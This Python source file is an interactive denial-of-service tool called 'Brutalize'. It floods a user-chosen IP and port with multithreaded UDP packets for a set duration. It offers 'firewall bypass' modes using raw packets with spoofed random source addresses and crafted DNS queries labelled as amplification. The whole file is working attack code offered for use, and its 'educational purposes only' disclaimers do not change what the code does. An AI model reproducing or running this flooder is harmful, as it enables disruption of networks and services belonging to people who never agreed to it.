from socket import socket, AF_INET, SOCK_DGRAM, SOCK_RAW, IPPROTO_RAW, IPPROTO_UDP
from threading import Thread, active_count
from random import choices, randint, random
from time import time, sleep
from struct import pack
from os import system, name as os_name
from sys import exit as sys_exit
from pystyle import *
from getpass import getpass as hinput
import ipaddress
import dns.resolver

class Brutalize:
    def __init__(self, ip, port, force, threads, duration, bypass_method):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100
        self.duration = duration  # attack duration in seconds
        self.bypass_method = bypass_method
        self.start_time = time()
        
        # Different socket types based on bypass method
        if bypass_method == 1:  # Standard UDP
            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
            self.data = str.encode("X" * self.force)
        elif bypass_method == 2:  # Raw sockets
            try:
                self.client = socket(family=AF_INET, type=SOCK_RAW, proto=IPPROTO_RAW)
                self.data = self._craft_raw_packet()
            except:
                print("\nRaw sockets require admin privileges! Falling back to UDP")
                self.client = socket(family=AF_INET, type=SOCK_DGRAM)
                self.data = str.encode("X" * self.force)
        elif bypass_method == 3:  # DNS amplification
            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
            self.data = self._craft_dns_query()
        
        self.len = len(self.data)
        self.sent = 0
        self.total = 0
        self.on = True

    def _craft_raw_packet(self):
        # Craft a raw IP/UDP packet to bypass some firewall rules
        packet = b''
        # IP Header (dummy values)
        packet += b'\x45\x00'  # Version, IHL, Type of Service
        packet += pack('!H', 20 + 8 + self.force)  # Total Length
        packet += b'\x00\x00\x00\x00\x40\x11\x00\x00'  # ID, Flags, Fragment, TTL, Protocol, Checksum
        packet += socket.inet_aton(self._randip())  # Source IP (randomized)
        packet += socket.inet_aton(self.ip)  # Destination IP
        # UDP Header
        packet += pack('!H', randint(1024, 65535))  # Source Port
        packet += pack('!H', self.port if self.port else randint(1, 65535))  # Destination Port
        packet += pack('!H', 8 + self.force)  # Length
        packet += b'\x00\x00'  # Checksum (0 for no checksum)
        # Payload
        packet += str.encode("X" * self.force)
        return packet

    def _craft_dns_query(self):
        # Craft DNS query for amplification attack
        # This is for educational purposes only - DNS amplification is illegal without permission
        query = b''
        # DNS header
        query += b'\xAA\xAA'  # Transaction ID
        query += b'\x01\x00'  # Flags: Standard query
        query += b'\x00\x01'  # Questions
        query += b'\x00\x00'  # Answer RRs
        query += b'\x00\x00'  # Authority RRs
        query += b'\x00\x00'  # Additional RRs
        # Query: example.com (random subdomain)
        parts = f"{randint(1,1000000)}.example.com".split('.')
        for part in parts:
            query += bytes([len(part)]) + part.encode()
        query += b'\x00'  # End of name
        query += b'\x00\x01'  # Type A
        query += b'\x00\x01'  # Class IN
        return query

    def _randip(self):
        # Generate random IP for source IP spoofing
        return ".".join(map(str, (randint(1, 254) for _ in range(4)))

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send, daemon=True).start()
        Thread(target=self.info, daemon=True).start()

    def info(self):
        interval = 0.05
        now = time()
        size = 0
        
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        
        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                elapsed = time() - self.start_time
                remaining = max(0, self.duration - elapsed) if self.duration else 0
                
                stats = (f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb "
                         f"{purple}-{white} Threads: {fluo}{active_count()-1}{white}")
                
                if self.duration:
                    stats += f" {purple}-{white} Time left: {fluo}{int(remaining)}s"
                
                print(stage(f"{stats}{' '*20}"), end='\r')

            now2 = time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1
            
            # Check duration
            if self.duration and (time() - self.start_time) > self.duration:
                self.stop()
                break

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                if self.bypass_method == 3:  # DNS amplification
                    # Send to DNS servers (in reality this would need open resolvers)
                    # For educational purposes we're just sending to target
                    self.client.sendto(self.data, (self.ip, 53))
                else:
                    self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                # On error, try recreating socket (bypasses some rate limits)
                try:
                    self.client.close()
                    if self.bypass_method == 2:
                        self.client = socket(family=AF_INET, type=SOCK_RAW, proto=IPPROTO_RAW)
                    else:
                        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
                except:
                    pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port if self.port else randint(1, 65535)

# ASCII Art and Banner
ascii = r'''
  ____             _          _   _             
 |  _ \           | |        | | (_)            
 | |_) |_ __ _   _| | ___   _| |_ _ _ __   __ _ 
 |  _ <| '__| | | | |/ / | | | __| | '_ \ / _` |
 | |_) | |  | |_| |   <| |_| | |_| | | | | (_| |
 |____/|_|   \__,_|_|\_\\__,_|\__|_|_| |_|\__, |
                                            __/ |
                                           |___/ 
'''

banner = r"""
   ▄▀▀▀▀▄    ▄▀▀█▄▄▄▄  ▄▀▀▀█▀▀▄  ▄▀▀▄ ▀▀▄  ▄▀▀▄▀▀▀▄ 
  █      █  ▐  ▄▀   ▐ █    █  ▐ █   ▀▄ ▄▀ █   █   █ 
  █      █    █▄▄▄▄▄  ▐   █     ▐     █   ▐  █▀▀█▀  
  ▀▄    ▄▀    █    ▌     █          ▄▀     ▄▀    █  
    ▀▀▀▀    ▄▀▄▄▄▄     ▄▀         █     █     █    
            █    ▐   █          ▄▀      ▐     ▐     
            ▐        ▐          ▐                  
""".replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

# Colors
fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))

def init():
    System.Size(140, 40)
    System.Title("BRUTAL UDP FLOOD - FIREWALL BYPASS TECHNIQUES")
    Cursor.HideCursor()

init()

def stage(text, symbol='...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    sys_exit()

def clear():
    system('cls' if os_name == 'nt' else 'clear')

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

def get_dns_servers():
    # For educational purposes only - in a real attack these would be open resolvers
    # This just returns some well-known public DNS servers
    return ['8.8.8.8', '1.1.1.1', '9.9.9.9']

def main():
    clear()
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    
    print(stage(f"Type {fluo2}.test{white} followed by target details to launch attack", '!'))
    print(stage(f"Example: {fluo2}.test 192.168.1.1:80 60{white} (IP:PORT DURATION)", '>'))
    
    while True:
        cmd = input(stage(f"Enter command {purple}->{fluo2} ", '?'))
        
        if cmd.lower().startswith('.test'):
            parts = cmd.split()
            if len(parts) < 2:
                error("Please specify target in format IP:PORT")
            
            target = parts[1]
            duration = int(parts[2]) if len(parts) > 2 else None
            
            # Parse target
            if ':' in target:
                ip, port = target.split(':')
                if not validate_port(port):
                    error("Invalid port number (1-65535)")
                port = int(port)
            else:
                ip = target
                port = None
            
            if not validate_ip(ip):
                error("Invalid IP address format")
            
            # Default values
            force = 1250
            threads = 100
            
            # Bypass method selection
            print("\n" + stage("Select firewall bypass technique:", '!'))
            print(stage(f"1. {fluo2}Standard UDP{white} - Basic UDP flood", '>'))
            print(stage(f"2. {fluo2}Raw Sockets{white} - Bypass some firewall rules (requires admin)", '>'))
            print(stage(f"3. {fluo2}DNS Amplification{white} - For educational purposes only", '>'))
            
            bypass_method = input(stage(f"Choose method (1-3) {purple}->{fluo2} ", '?'))
            try:
                bypass_method = int(bypass_method)
                if bypass_method not in [1, 2, 3]:
                    raise ValueError
            except ValueError:
                error("Please enter a number between 1 and 3")
            
            print("\n" + stage(f"Starting attack on {fluo2}{ip}{f':{port}' if port else ''}{white}..."), end='\r')
            
            brute = Brutalize(ip, port, force, threads, duration, bypass_method)
            try:
                brute.flood()
            except Exception as e:
                brute.stop()
                error(f"A fatal error occurred: {str(e)}", '')
            
            try:
                while brute.on:
                    sleep(1)
            except KeyboardInterrupt:
                brute.stop()
                print("\n" + stage(f"Attack stopped by user. {fluo2}{ip}{f':{port}' if port else ''}{white} received {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
            
            print("\n")
            break
        
        elif cmd.lower() == '.exit':
            print("\n")
            break
        else:
            print(stage(f"Unknown command. Type {fluo2}.test{white} to start or {fluo2}.exit{white} to quit", '!'))
    
    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))

if __name__ == '__main__':
    print("\nDISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY. TESTING MY OWN ROUTER ONLY.")
    print("DO NOT USE THIS TOOL TO ATTACK SYSTEMS WITHOUT PERMISSION.\n")
    main()